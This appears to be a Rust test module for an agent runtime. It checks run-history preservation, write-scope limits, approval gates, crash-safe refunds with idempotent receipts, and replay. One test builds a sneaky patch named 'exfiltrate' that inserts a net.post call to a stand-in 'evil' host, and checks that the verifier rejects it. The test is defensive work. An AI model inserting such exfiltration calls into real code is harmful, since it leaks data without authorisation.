    fn repeated_runs_get_distinct_ids_and_never_overwrite_history() {
        // Running the same goal over the same source twice in one store must
        // produce two distinct runs — the second must not truncate the first's
        // history. This is the property a real long-horizon runtime depends on.
        let repo = TempRepo::new("repeat");
        let (spec1, ws1) = demo();
        let first = start_run(repo.path(), spec1, ws1, Strategy::Minimal, None).unwrap();
        let (spec2, ws2) = demo();
        let second = start_run(repo.path(), spec2, ws2, Strategy::Minimal, None).unwrap();

        // The first run keeps the clean fingerprint id; the second is uniquified.
        let fp = store::fingerprint("FixFailingTests", &demo().1.files);
        assert_eq!(first.state.run_id, fp);
        assert_ne!(first.state.run_id, second.state.run_id);
        assert!(second.state.run_id.starts_with(&format!("{}-", fp)));

        // Both histories survive independently, each ending in run.completed.
        for id in [&first.state.run_id, &second.state.run_id] {
            let events = read_all(&store::events_path(repo.path(), id)).unwrap();
            assert_eq!(
                events
                    .iter()
                    .filter(|e| e.kind == kind::PATCH_APPLIED)
                    .count(),
                3,
                "history for {id} is intact"
            );
            assert_eq!(events.last().unwrap().kind, kind::RUN_COMPLETED);
        }

        // The store reports both as runs of the same fingerprint.
        assert_eq!(store::runs_for_fingerprint(repo.path(), &fp).len(), 2);
    }

    #[test]
    fn event_log_create_refuses_to_clobber() {
        // The last line of defense: even handed a path whose history exists,
        // EventLog::create must refuse rather than truncate.
        let repo = TempRepo::new("noclobber");
        let path = repo.path().join("events.jsonl");
        let mut log = EventLog::create(&path, "run_x").unwrap();
        log.append("run.started", serde_json::json!({})).unwrap();
        assert!(EventLog::create(&path, "run_x").is_err());
        // The original line is still there.
        assert_eq!(read_all(&path).unwrap().len(), 1);
    }

    #[test]
    fn out_of_scope_writes_are_rejected_and_the_run_fails() {
        // A goal that may only write tests/** cannot repair bugs that live in
        // src/**: every patch is rejected before it touches the tree.
        let repo = TempRepo::new("scope");
        let (mut spec, ws) = demo();
        spec.allow.fs_write = vec!["tests/**".into()];
        spec.budget.retries = Some(1);
        let r = start_run(repo.path(), spec, ws, Strategy::Minimal, None).unwrap();
        assert_eq!(r.state.status, "failed");
        assert_eq!(r.state.patches_applied, 0);
        assert!(r.state.patches_rejected >= 1);

        let events = read_all(&store::events_path(repo.path(), &r.state.run_id)).unwrap();
        assert!(events.iter().any(|e| e.kind == kind::PATCH_REJECTED));
        assert!(events.iter().all(|e| e.kind != kind::PATCH_APPLIED));
    }

    #[test]
    fn effect_authority_blocks_an_ungranted_effect() {
        // A goal granted no effects must reject any patch that would make the
        // program perform a brand-new effect — even via the deterministic loop.
        // We model the danger directly through the pipeline the runtime uses.
        use crate::patch::{verify_patch, Edit, Patch, VerifyOpts};
        let mut ws = Workspace::new();
        ws.insert("src/m.tach", "fn pure(x: Int) -> Int {\n  return x\n}\n");
        ws.insert(
            "tests/m_test.tach",
            "test \"id\" {\n  ensure pure(2) == 2\n}\n",
        );
        let at = "fn pure(x: Int) -> Int {\n  ".len();
        let patch = Patch {
            name: "sneak-net".into(),
            reason: "exfiltrate".into(),
            touches: vec!["src/**".into()],
            edits: vec![Edit {
                file: "src/m.tach".into(),
                span: crate::span::Span::at(at),
                replacement: "net.post(\"http://evil\", \"x\")\n  ".into(),
            }],
            prove: vec![],
        };
        let opts = VerifyOpts {
            allow_new_effects: false,
            forbid_api_break: false,
            allowed_effects: Some(std::collections::BTreeSet::new()),
            allowed_writes: Some(vec!["src/**".into()]),
        };
        let v = verify_patch(&ws, &patch, &opts);
        assert!(!v.accepted);
        assert!(v
            .rejections
            .iter()
            .any(|r| r.contains("outside the goal's authority")));
    }

    // ====================================================================
    // Action layer
    // ====================================================================

    use crate::action::{self, ActionPlan, PlannedAction};
    use crate::goal::{AllowSpec, BudgetSpec};

    fn resolve_dup() -> (GoalSpec, ActionPlan) {
        action::builtin_action_goal("ResolveDuplicateCharge").expect("catalog entry")
    }

    /// Mirror what `tach goal approve` does: flip the approval file to a terminal
    /// status and append the decision event (the human decision is recorded once,
    /// here, never re-emitted by the driver).
    fn decide(repo: &Path, run_id: &str, action_id: &str, status: &str, kind_const: &str) {
        let apr_id = store::approval_id(run_id, action_id);
        let mut a = store::load_approval(repo, run_id, &apr_id).expect("approval exists");
        a.status = status.into();
        store::save_approval(repo, run_id, &a).unwrap();
        let mut log = EventLog::resume(&store::events_path(repo, run_id), run_id).unwrap();
        log.append(
            kind_const,
            json!({ "approval_id": apr_id, "action": action_id }),
        )
        .unwrap();
    }
    fn approve(repo: &Path, run_id: &str, action_id: &str) {
        decide(repo, run_id, action_id, "granted", kind::APPROVAL_GRANTED);
    }
    fn deny(repo: &Path, run_id: &str, action_id: &str) {
        decide(repo, run_id, action_id, "denied", kind::APPROVAL_DENIED);
    }

    fn count_kind(repo: &Path, run_id: &str, k: &str) -> usize {
        read_all(&store::events_path(repo, run_id))
            .unwrap()
            .iter()
            .filter(|e| e.kind == k)
            .count()
    }
    fn refund_tool_calls(repo: &Path, run_id: &str) -> usize {
        read_all(&store::events_path(repo, run_id))
            .unwrap()
            .iter()
            .filter(|e| {
                e.kind == kind::TOOL_CALLED
                    && e.payload.get("tool").and_then(|v| v.as_str()) == Some("fake.stripe.refund")
            })
            .count()
    }

    #[test]
    fn action_run_pauses_at_approval_gate() {
        let repo = TempRepo::new("act_pause");
        let (spec, plan) = resolve_dup();
        let r = start_action_run(repo.path(), spec, plan, None).unwrap();
        assert!(r.paused);
        assert_eq!(r.state.status, "awaiting_approval");
        assert_eq!(r.state.cursor, 1, "lookup done, paused at the refund gate");
        assert_eq!(r.state.receipts_created, 0);
        let aprs = store::list_approvals(repo.path(), &r.state.run_id);
        assert_eq!(aprs.len(), 1);
        assert_eq!(aprs[0].status, "pending");
        assert_eq!(
            count_kind(repo.path(), &r.state.run_id, kind::APPROVAL_REQUESTED),
            1
        );
        assert!(store::list_receipts(repo.path(), &r.state.run_id).is_empty());
    }

    #[test]
    fn approve_then_resume_executes_exactly_one_refund() {
        let repo = TempRepo::new("act_approve");
        let (spec, plan) = resolve_dup();
        let r = start_action_run(repo.path(), spec, plan, None).unwrap();
        let id = r.state.run_id.clone();
        approve(repo.path(), &id, "refund");
        let done = resume_action_run(repo.path(), &id, None).unwrap();
        assert_eq!(done.state.status, "completed");
        assert_eq!(done.state.actions_executed, 4);
        let receipts = store::list_receipts(repo.path(), &id);
        assert_eq!(receipts.len(), 3, "refund + email + zendesk");
        assert_eq!(
            receipts
                .iter()
                .filter(|r| r.tool == "fake.stripe.refund")
                .count(),
            1
        );
        assert_eq!(refund_tool_calls(repo.path(), &id), 1);
    }

    #[test]
    fn crash_after_receipt_does_not_double_refund() {
        // The killer property. Crash in the intra-action danger window — after the
        // refund receipt is durable but before the cursor advances — then resume.
        // The refund must NOT be invoked a second time.
        let repo = TempRepo::new("act_killer");
        let (spec, plan) = resolve_dup();
        let r = start_action_run(repo.path(), spec, plan, None).unwrap();
        let id = r.state.run_id.clone();
        approve(repo.path(), &id, "refund");

        let crashed =
            resume_action_run(repo.path(), &id, Some(ActionCrash::AfterReceipt(1))).unwrap();
        assert!(crashed.crashed);
        assert_eq!(
            store::list_receipts(repo.path(), &id).len(),
            1,
            "the refund receipt is already durable at the crash"
        );

        let done = resume_action_run(repo.path(), &id, None).unwrap();
        assert_eq!(done.state.status, "completed");
        assert_eq!(
            refund_tool_calls(repo.path(), &id),
            1,
            "fake.stripe.refund is called exactly once across the whole run"
        );
        assert!(
            count_kind(repo.path(), &id, kind::RECEIPT_REUSED) >= 1,
            "the re-entered refund reused its receipt instead of re-calling"
        );
        let receipts = store::list_receipts(repo.path(), &id);
        assert_eq!(
            receipts
                .iter()
                .filter(|r| r.tool == "fake.stripe.refund")
                .count(),
            1
        );
    }

    #[test]
    fn crash_at_step_boundary_resumes_clean() {
        // The killer-demo line: resume --crash-after step:4 crashes right after the
        // notify (step 4), with the refund (step 3) already durably done.
        let repo = TempRepo::new("act_step4");
        let (spec, plan) = resolve_dup();
        let r = start_action_run(repo.path(), spec, plan, None).unwrap();
        let id = r.state.run_id.clone();
        approve(repo.path(), &id, "refund");

        let crashed = resume_action_run(repo.path(), &id, Some(ActionCrash::Step(4))).unwrap();
        assert!(crashed.crashed);
        assert_eq!(crashed.state.step, 4);
        assert_eq!(
            store::list_receipts(repo.path(), &id).len(),
            2,
            "refund + notify done before the step-4 crash"
        );

        let done = resume_action_run(repo.path(), &id, None).unwrap();
        assert_eq!(done.state.status, "completed");
        let receipts = store::list_receipts(repo.path(), &id);
        assert_eq!(receipts.len(), 3);
        assert_eq!(
            receipts
                .iter()
                .filter(|r| r.tool == "fake.stripe.refund")
                .count(),
            1
        );
        assert_eq!(refund_tool_calls(repo.path(), &id), 1);
    }

    #[test]
    fn replay_reproduces_status_and_receipt_set() {
        // A straight run.
        let straight_repo = TempRepo::new("act_replay_a");
        let (spec, plan) = resolve_dup();
        let s = start_action_run(straight_repo.path(), spec, plan, None).unwrap();
        let sid = s.state.run_id.clone();
        approve(straight_repo.path(), &sid, "refund");
        resume_action_run(straight_repo.path(), &sid, None).unwrap();
        let rep = replay_action_run(straight_repo.path(), &sid).unwrap();
        assert!(
            rep.identical,
            "replay diverged: {:?} vs {:?}",
            rep.recorded_status, rep.replayed_status
        );
        assert_eq!(rep.replayed_status, "completed");

        // A crashed-and-resumed run reaches the same effects.
        let crash_repo = TempRepo::new("act_replay_b");
        let (spec2, plan2) = resolve_dup();
        let c = start_action_run(crash_repo.path(), spec2, plan2, None).unwrap();
        let cid = c.state.run_id.clone();
        approve(crash_repo.path(), &cid, "refund");
        resume_action_run(crash_repo.path(), &cid, Some(ActionCrash::AfterReceipt(1))).unwrap();
        resume_action_run(crash_repo.path(), &cid, None).unwrap();
        assert!(
            replay_action_run(crash_repo.path(), &cid)
                .unwrap()
                .identical
        );

        // The crashed run's history is longer, yet its effects (receipt outputs,
        // which are a pure function of the fixed plan inputs) are identical.
        let n_straight = read_all(&store::events_path(straight_repo.path(), &sid))
            .unwrap()
            .len();
        let n_crash = read_all(&store::events_path(crash_repo.path(), &cid))
            .unwrap()
            .len();
        assert!(
            n_crash > n_straight,
            "crash+resume produces strictly more events ({n_crash} vs {n_straight})"
        );
        let outputs = |repo: &Path, id: &str| -> BTreeMap<String, serde_json::Value> {
            store::list_receipts(repo, id)
                .into_iter()
                .map(|r| (r.tool, r.output))
                .collect()
        };
        assert_eq!(
            outputs(straight_repo.path(), &sid),
            outputs(crash_repo.path(), &cid),
            "same effects despite different histories"
        );
    }

    #[test]
    fn resume_while_still_pending_is_a_noop() {
        let repo = TempRepo::new("act_pending");
        let (spec, plan) = resolve_dup();
        let r = start_action_run(repo.path(), spec, plan, None).unwrap();
        let id = r.state.run_id.clone();
        // Resume WITHOUT approving.
        let again = resume_action_run(repo.path(), &id, None).unwrap();
        assert!(again.paused);
        assert_eq!(
            again.state.cursor, 1,
            "cursor did not advance past the gate"
        );
        assert_eq!(
            store::list_approvals(repo.path(), &id).len(),
            1,
            "no new approval"
        );
        assert!(store::list_receipts(repo.path(), &id).is_empty());
        assert_eq!(
            count_kind(repo.path(), &id, kind::APPROVAL_REQUESTED),
            1,
            "approval requested exactly once"
        );
    }

    #[test]
    fn deny_then_resume_fails_without_side_effect() {
        let repo = TempRepo::new("act_deny");
        let (spec, plan) = resolve_dup();
        let r = start_action_run(repo.path(), spec, plan, None).unwrap();
        let id = r.state.run_id.clone();
        deny(repo.path(), &id, "refund");
        let done = resume_action_run(repo.path(), &id, None).unwrap();
        assert_eq!(done.state.status, "denied");
        assert_eq!(refund_tool_calls(repo.path(), &id), 0);
        assert!(
            store::list_receipts(repo.path(), &id)
                .iter()
                .all(|r| r.tool != "fake.stripe.refund"),
            "no refund effect happened"
        );
        assert!(count_kind(repo.path(), &id, kind::ACTION_SKIPPED) >= 1);
    }

    #[test]
    fn replay_after_denial_reproduces_denied() {
        let repo = TempRepo::new("act_deny_replay");
        let (spec, plan) = resolve_dup();
        let r = start_action_run(repo.path(), spec, plan, None).unwrap();
        let id = r.state.run_id.clone();
        deny(repo.path(), &id, "refund");
        resume_action_run(repo.path(), &id, None).unwrap();
        let rep = replay_action_run(repo.path(), &id).unwrap();
        assert!(rep.identical);
        assert_eq!(rep.replayed_status, "denied");
    }

    #[test]
    fn ungranted_tool_fails_before_invocation() {
        let repo = TempRepo::new("act_authz");
        let spec = GoalSpec {
            name: "Authz".into(),
            success: None,
            budget: BudgetSpec {
                steps: Some(10),
                retries: None,
                time: None,
                cost: None,
            },
            allow: AllowSpec {
                tools: vec!["fake.email.send".into()],
                ..Default::default()
            },
            require: vec![],
        };
        let plan = ActionPlan {
            steps: vec![PlannedAction {
                id: "x".into(),
                tool: "fake.stripe.refund".into(), // not granted
                input: serde_json::json!({}),
                requires_approval: false,
                effectful: true,
                summary: String::new(),
            }],
        };
        let r = start_action_run(repo.path(), spec, plan, None).unwrap();
        assert_eq!(r.state.status, "failed");
        assert!(store::list_receipts(repo.path(), &r.state.run_id).is_empty());
        assert_eq!(
            count_kind(repo.path(), &r.state.run_id, kind::TOOL_CALLED),
            0
        );
    }

    #[test]
    fn budget_does_not_strand_a_granted_gate() {
        // A budget tight enough to stop after the refund must still HONOR an already
        // granted gate (the refund), not void it — then stop before the next action.
        let repo = TempRepo::new("act_budget");
        let (mut spec, plan) = resolve_dup();
        spec.budget.steps = Some(2); // allow cursor 0 (lookup) and 1 (refund) only
        let r = start_action_run(repo.path(), spec, plan, None).unwrap();
        let id = r.state.run_id.clone();
        assert!(r.paused);
        approve(repo.path(), &id, "refund");
        let done = resume_action_run(repo.path(), &id, None).unwrap();
        assert_eq!(done.state.status, "budget_exhausted");
        assert_eq!(
            refund_tool_calls(repo.path(), &id),
            1,
            "the granted refund executed and was not stranded by the budget"
        );
        assert_eq!(store::list_receipts(repo.path(), &id).len(), 1);
    }

    #[test]
    fn tool_failure_mid_plan_is_durable() {
        // A later tool failure must not undo an earlier committed effect.
        let repo = TempRepo::new("act_toolfail");
        let spec = GoalSpec {
            name: "FailMid".into(),
            success: None,
            budget: BudgetSpec {
                steps: Some(10),
                retries: None,
                time: None,
                cost: None,
            },
            allow: AllowSpec {
                tools: vec!["fake.stripe.refund".into(), "fake.broken".into()],
                ..Default::default()
            },
            require: vec![],
        };
        let plan = ActionPlan {
            steps: vec![
                PlannedAction {
                    id: "refund".into(),
                    tool: "fake.stripe.refund".into(),
                    input: serde_json::json!({ "amount_cents": 100 }),
                    requires_approval: false,
                    effectful: true,
                    summary: String::new(),
                },
                PlannedAction {
                    id: "boom".into(),
                    tool: "fake.broken".into(), // granted, but invoke_fake_tool errors
                    input: serde_json::json!({}),
                    requires_approval: false,
                    effectful: true,
                    summary: String::new(),
                },
            ],
        };
        let r = start_action_run(repo.path(), spec, plan, None).unwrap();
        let id = r.state.run_id.clone();
        assert_eq!(r.state.status, "failed");
        assert_eq!(count_kind(repo.path(), &id, kind::TOOL_FAILED), 1);
        let receipts = store::list_receipts(repo.path(), &id);
        assert_eq!(
            receipts
                .iter()
                .filter(|x| x.tool == "fake.stripe.refund")
                .count(),
            1,
            "the earlier refund receipt survives the later failure"
        );
    }

    #[test]
    fn ship_hotfix_pr_full_flow() {
        let repo = TempRepo::new("ship_pr");
        let (spec, plan) = action::builtin_action_goal("ShipHotfixPR").unwrap();
        let r = start_action_run(repo.path(), spec, plan, None).unwrap();
        let id = r.state.run_id.clone();
        assert!(r.paused, "pauses on the create_pr gate");
        approve(repo.path(), &id, "open_pr");
        let done = resume_action_run(repo.path(), &id, None).unwrap();
        assert_eq!(done.state.status, "completed");
        let receipts = store::list_receipts(repo.path(), &id);
        assert_eq!(receipts.len(), 2);
        assert_eq!(
            receipts
                .iter()
                .filter(|x| x.tool == "fake.github.create_pr")
                .count(),
            1
        );
        assert!(replay_action_run(repo.path(), &id).unwrap().identical);
    }

    #[test]
    fn action_run_writes_only_under_dot_tach() {
        let repo = TempRepo::new("act_nofiles");
        let (spec, plan) = resolve_dup();
        start_action_run(repo.path(), spec, plan, None).unwrap();
        let entries: Vec<String> = std::fs::read_dir(repo.path())
            .unwrap()
            .flatten()
            .map(|e| e.file_name().to_string_lossy().to_string())
            .collect();
        assert_eq!(
            entries,
            vec![".tach".to_string()],
            "an action goal writes nothing into the working tree"
        );
    }

    #[test]
    fn old_state_json_loads_with_defaults() {
        let repo = TempRepo::new("act_backcompat");
        let run_id = "run_old";
        let dir = store::run_dir(repo.path(), run_id);
        std::fs::create_dir_all(&dir).unwrap();
        // A state.json written before the action layer (no kind/cursor/etc.).
        let old = r#"{"run_id":"run_old","goal":"X","status":"running","step":2,"consecutive_rejections":0,"patches_applied":1,"patches_rejected":0,"tests_run":3,"regressions":0,"diff_chars":4,"final_errors":0,"tests_passed":3,"tests_failed":0}"#;
        std::fs::write(dir.join("state.json"), old).unwrap();
        let s = store::load_state(repo.path(), run_id).unwrap();
        assert_eq!(s.kind, "");
        assert_eq!(s.cursor, 0);
        assert!(s.pending_approval.is_none());
        assert_eq!(s.receipts_created, 0);
    }

    #[test]
    fn idempotency_key_is_object_order_independent() {
        let a = serde_json::json!({ "x": 1, "y": 2, "z": "q" });
        let mut m = serde_json::Map::new();
        m.insert("z".into(), serde_json::json!("q"));
        m.insert("y".into(), serde_json::json!(2));
        m.insert("x".into(), serde_json::json!(1));
        let b = serde_json::Value::Object(m);
        assert_eq!(store::canonical_bytes(&a), store::canonical_bytes(&b));
        assert_eq!(
            store::idempotency_key("r", "act", "t", &a),
            store::idempotency_key("r", "act", "t", &b)
        );
    }

    #[test]
    fn approval_id_is_deterministic_offline() {
        assert_eq!(
            store::approval_id("run_x", "refund"),
            store::approval_id("run_x", "refund")
        );
        assert_ne!(
            store::approval_id("run_x", "refund"),
            store::approval_id("run_y", "refund")
        );
        assert!(store::approval_id("run_x", "refund").starts_with("apr_"));
    }
}
